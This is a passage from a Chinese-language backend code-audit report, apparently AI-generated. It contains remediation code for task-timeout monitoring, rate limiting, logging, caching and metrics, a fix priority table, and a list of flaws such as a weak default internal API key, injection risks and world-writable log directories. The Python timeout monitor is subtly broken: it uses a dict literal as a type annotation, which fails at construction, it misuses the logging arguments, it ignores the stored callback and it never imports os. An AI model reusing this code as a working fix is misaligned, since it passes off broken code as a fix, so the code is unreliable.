**影响范围**: 任务执行可靠性

**问题描述**:

Worker中没有完善的超时监控机制，可能导致任务永久卡住。

**解决方案**:

```python
# ===== 任务超时监控 =====
# app/backend/src/workers/task_timeout_monitor.py

import time
import threading
import logging
from datetime import datetime, timezone, timedelta
from typing import Dict, Callable

logger = logging.getLogger(__name__)

class TaskTimeoutMonitor:
    """任务超时监控器"""

    def __init__(self):
        self.monitored_tasks: Dict[str, {
            'timeout_at': datetime,
            'task_id': str,
            'user_id': str,
            'on_timeout': Callable
        }] = {}
        self.monitor_thread = None
        self.running = False
        self.lock = threading.Lock()

    def start_monitoring(
        self,
        task_id: str,
        user_id: str,
        timeout_seconds: int,
        on_timeout: Callable
    ):
        """
        开始监控任务超时

        :param task_id: 任务ID
        :param user_id: 用户ID
        :param timeout_seconds: 超时时间（秒）
        :param on_timeout: 超时回调函数
        """
        timeout_at = datetime.now(timezone.utc) + timedelta(seconds=timeout_seconds)

        with self.lock:
            self.monitored_tasks[task_id] = {
                'timeout_at': timeout_at,
                'task_id': task_id,
                'user_id': user_id,
                'on_timeout': on_timeout
            }

        logger.info({
            'task_id': task_id,
            'user_id': user_id,
            'timeout_at': timeout_at.isoformat(),
            'timeout_seconds': timeout_seconds
        }, 'Started monitoring task for timeout')

    def stop_monitoring(self, task_id: str):
        """
        停止监控任务

        :param task_id: 任务ID
        """
        with self.lock:
            if task_id in self.monitored_tasks:
                del self.monitored_tasks[task_id]
                logger.debug({'task_id': task_id}, 'Stopped monitoring task')

    def _timeout_callback(self, task_info: Dict):
        """
        超时回调处理

        :param task_info: 任务信息
        """
        task_id = task_info['task_id']
        user_id = task_info['user_id']

        logger.error({
            'task_id': task_id,
            'user_id': user_id
        }, f'Task {task_id} timed out, forcing cleanup...')

        try:
            # 1. 更新任务状态为超时
            from toolWorker import update_task_status_via_api
            update_task_status_via_api(
                task_id,
                'EXECUTION_TIMEOUT',
                {
                    'errorMessage': 'Task execution timeout',
                    'timeoutAt': datetime.now(timezone.utc).isoformat()
                }
            )

            # 2. 强制清理容器
            from container_manager import cleanup_container_for_task
            cleanup_container_for_task(task_id, reason="timeout")

            # 3. 释放并发槽位
            # 需要从task_id获取user_id
            # (可以通过提前存储映射关系实现)

            logger.info({'task_id': task_id}, 'Timeout cleanup completed')

        except Exception as e:
            logger.error({
                'task_id': task_id,
                'error': str(e)
            }, 'Error during timeout cleanup')

    def start_monitor_thread(self, check_interval_seconds: int = 5):
        """
        启动监控线程

        :param check_interval_seconds: 检查间隔（秒）
        """
        if self.running:
            logger.warn('Timeout monitor thread already running')
            return

        self.running = True

        def monitor_loop():
            while self.running:
                try:
                    now = datetime.now(timezone.utc)
                    expired_tasks = []

                    # 检查超时任务
                    with self.lock:
                        for task_id, info in list(self.monitored_tasks.items()):
                            if now >= info['timeout_at']:
                                expired_tasks.append(info)

                    # 处理超时任务
                    for task_info in expired_tasks:
                        try:
                            self._timeout_callback(task_info)
                            # 从监控列表移除
                            self.stop_monitoring(task_info['task_id'])
                        except Exception as e:
                            logger.error({
                                'task_id': task_info['task_id'],
                                'error': str(e)
                            }, 'Error in timeout callback')

                    # 等待下一次检查
                    time.sleep(check_interval_seconds)

                except Exception as e:
                    logger.error({'error': str(e)}, 'Monitor thread error')
                    time.sleep(check_interval_seconds)

        self.monitor_thread = threading.Thread(target=monitor_loop, daemon=True)
        self.monitor_thread.start()
        logger.info('Task timeout monitor thread started')

    def stop_monitor_thread(self):
        """停止监控线程"""
        self.running = False
        if self.monitor_thread:
            self.monitor_thread.join(timeout=5)
            logger.info('Task timeout monitor thread stopped')

# 全局实例
task_timeout_monitor = TaskTimeoutMonitor()

# ===== 在Worker中使用 =====
# app/backend/src/workers/toolWorker.py

def process_task_ecs_only(task, task_logger):
    """处理ECS Only模式的任务"""

    task_id = task.id
    user_id = task.userId

    # 计算超时时间
    queue_timeout_minutes = int(os.environ.get('QUEUE_WAIT_TIMEOUT_MINUTES', '35'))
    container_startup_timeout = 180  # 3分钟
    execution_timeout_minutes = int(os.environ.get('CONTAINER_EXECUTION_TIMEOUT_MINUTES', '3'))

    total_timeout_seconds = (
        queue_timeout_minutes * 60 +
        container_startup_timeout +
        execution_timeout_minutes * 60
    )

    # ✅ 开始监控
    task_timeout_monitor.start_monitoring(
        task_id=task_id,
        user_id=user_id,
        timeout_seconds=total_timeout_seconds,
        on_timeout=lambda: None  # 使用默认回调
    )

    try:
        # ... 原有任务处理逻辑 ...

        # 任务完成，停止监控
        task_timeout_monitor.stop_monitoring(task_id)

    except Exception as e:
        # 任务失败，停止监控
        task_timeout_monitor.stop_monitoring(task_id)
        raise

# 在Worker启动时启动监控线程
def main():
    # ... 原有初始化 ...

    # ✅ 启动超时监控线程
    task_timeout_monitor.start_monitor_thread(check_interval_seconds=5)

    logger.info("Worker started with timeout monitoring")

    # ... 原有主循环 ...
```

---

## 3. 中等优先级问题 (P2)

### 3.1 缺少API请求限流

**风险等级**: 🟡 P2 - 中

**解决方案**:

```typescript
import rateLimit from 'express-rate-limit';

// 通用API限流
const generalLimiter = rateLimit({
  windowMs: 15 * 60 * 1000, // 15分钟
  max: 100, // 限制100次请求
  message: {
    error: 'Too many requests from this IP, please try again later.',
    code: 'RATE_LIMIT_EXCEEDED'
  },
  standardHeaders: true,
  legacyHeaders: false,
  skip: (req) => {
    // 跳过健康检查端点
    return req.path === '/health' || req.path === '/metrics';
  }
});

// 登录API严格限流
const loginLimiter = rateLimit({
  windowMs: 15 * 60 * 1000,
  max: 5, // 15分钟内最多5次登录尝试
  skipSuccessfulRequests: true, // 成功的请求不计入限制
  message: {
    error: 'Too many login attempts, please try again later.',
    code: 'LOGIN_RATE_LIMIT_EXCEEDED'
  }
});

// 任务提交限流
const taskSubmitLimiter = rateLimit({
  windowMs: 60 * 1000, // 1分钟
  max: 10, // 每分钟最多10个任务
  message: {
    error: 'Too many task submissions, please slow down.',
    code: 'TASK_SUBMIT_RATE_LIMIT_EXCEEDED'
  }
});

// 应用限流
app.use('/api/', generalLimiter);
app.use('/api/auth/login', loginLimiter);
app.use('/api/tasks', taskSubmitLimiter);
```

---

### 3.2 日志管理不完善

**风险等级**: 🟡 P2 - 中

**解决方案**:

```typescript
import winston from 'winston';
import winstonDaily from 'winston-daily-rotate-file';

const logFormat = winston.format.combine(
  winston.format.timestamp({ format: 'YYYY-MM-DD HH:mm:ss' }),
  winston.format.errors({ stack: true }),
  winston.format.json()
);

const transport = new winstonDaily({
  filename: 'logs/application-%DATE%.log',
  datePattern: 'YYYY-MM-DD',
  zippedArchive: true,
  maxSize: '20m',
  maxFiles: '30d'  // 保留30天
});

const logger = winston.createLogger({
  level: process.env.LOG_LEVEL || 'info',
  format: logFormat,
  transports: [
    transport,
    new winston.transports.Console({
      format: winston.format.combine(
        winston.format.colorize(),
        winston.format.simple()
      )
    })
  ]
});
```

---

### 3.3 缺少缓存策略

**风险等级**: 🟡 P2 - 中

**解决方案**:

```typescript
export class CacheService {
  private redis: Redis;
  private DEFAULT_TTL = 300; // 5分钟

  async get<T>(key: string): Promise<T | null> {
    const cached = await this.redis.get(key);
    return cached ? JSON.parse(cached) : null;
  }

  async set(key: string, value: any, ttl?: number): Promise<void> {
    await this.redis.setex(
      key,
      ttl || this.DEFAULT_TTL,
      JSON.stringify(value)
    );
  }

  async invalidate(pattern: string): Promise<void> {
    const keys = await this.redis.keys(pattern);
    if (keys.length > 0) {
      await this.redis.del(...keys);
    }
  }
}
```

---

## 4. 低优先级问题 (P3)

### 4.1 错误处理不统一

**解决方案**:

```typescript
export class ApiError extends Error {
  constructor(
    public statusCode: number,
    public message: string,
    public code?: string
  ) {
    super(message);
    this.name = 'ApiError';
  }
}

export function asyncHandler(
  fn: (req: Request, res: Response, next: NextFunction) => Promise<any>
) {
  return (req: Request, res: Response, next: NextFunction) => {
    Promise.resolve(fn(req, res, next)).catch(next);
  };
}
```

---

## 5. 高并发场景优化

### 5.1 引入消息队列

考虑从Redis升级到RabbitMQ或Redis Stream。

### 5.2 数据库读写分离

```typescript
const writePrisma = new PrismaClient({
  datasources: {
    db: { url: process.env.DATABASE_WRITE_URL }
  }
});

const readPrisma = new PrismaClient({
  datasources: {
    db: { url: process.env.DATABASE_READ_URL }
  }
});
```

---

## 6. 监控与告警建议

```typescript
import promClient from 'prom-client';

const taskProcessingRate = new promClient.Counter({
  name: 'task_processing_total',
  help: 'Total number of tasks processed',
  labelNames: ['status']
});

const queueLength = new promClient.Gauge({
  name: 'task_queue_length',
  help: 'Current task queue length'
});
```

---

## 7. 修复优先级与时间表

| 优先级 | 问题 | 预计工作量 | 建议时间 |
|-------|------|-----------|---------|
| P0 | JWT安全漏洞（Token刷新、IP绑定、登录锁定） | 2天 | 立即 |
| P0 | 支付回调签名验证缺失 | 1天 | 立即 |
| P0 | 文件上传路径遍历漏洞 | 1天 | 立即 |
| P0 | 内部API密钥存在弱默认值 | 0.5天 | 立即 |
| P0 | 任务参数存在注入风险 | 2天 | 立即 |
| P0 | 文件上传只验证扩展名不验证内容 | 1天 | 立即 |
| P0 | 日志目录权限过于宽松（777） | 0.5天 | 立即 |
| P1 | 并发控制竞态条件和TTL计算错误 | 2天 | 1周内 |
| P1 | 容器资源泄漏和孤儿容器清理 | 2天 | 1周内 |
| P1 | 数据库N+1查询优化 | 3天 | 2周内 |
| P1 | Redis连接池优化 | 2天 | 2周内 |
| P1 | 任务超时监控机制 | 2天 | 2周内 |
| P1 | SDC初始化绕过TaskIdGeneratorService | 1天 | 2周内 |
| P2 | API限流 | 1天 | 1个月内 |
| P2 | 日志管理完善 | 2天 | 1个月内 |
| P2 | 缓存策略 | 3天 | 1个月内 |
| P2 | WebSocket用户枚举防护 | 1天 | 1个月内 |
| P2 | 管理员操作审计日志 | 1天 | 1个月内 |
| P2 | 重放攻击防护 | 2天 | 1个月内 |

---

## 8. 总结与建议

### 关键改进方向

1. **安全性**: 优先修复7个P0级别漏洞（JWT、支付回调、文件上传、内部API、参数注入、文件内容验证、目录权限）
2. **稳定性**: 加强并发控制和容器资源管理，修复槽位泄漏和竞态条件
3. **性能**: 优化数据库查询、增加缓存、实现限流
4. **可维护性**: 统一错误处理、增加测试、完善监控

### 本次深度审查新增发现

本次深入代码审查发现了**4个文档中未提及的隐形严重安全风险**：

| 新增P0问题 | 风险描述 | 潜在影响 |
|-----------|---------|---------|
| 内部API密钥弱默认值 | 使用可预测的默认密钥`worker-internal-key` | 未授权任务状态操作 |
| 任务参数注入风险 | 用户参数直接存储未经验证 | 命令注入、路径遍历 |
| 文件内容验证缺失 | 只验证扩展名不验证实际内容 | 上传恶意文件 |
| 日志目录权限过宽 | 使用777权限，世界可写 | 权限提升、符号链接攻击 |

### 长期演进建议

1. **短期 (1-2周)**: 修复所有7个P0问题（预计约8.5天工作量）
2. **中期 (1个月)**: 修复6个P1问题，实现限流和监控
3. **长期 (3个月)**: 完善测试覆盖，优化架构，添加安全审计

---

*报告生成时间: 2025-01-07*
*分析版本: dev分支 (commit: 13e87ff)*
*分析工具: Claude Code (GLM-4.7)*
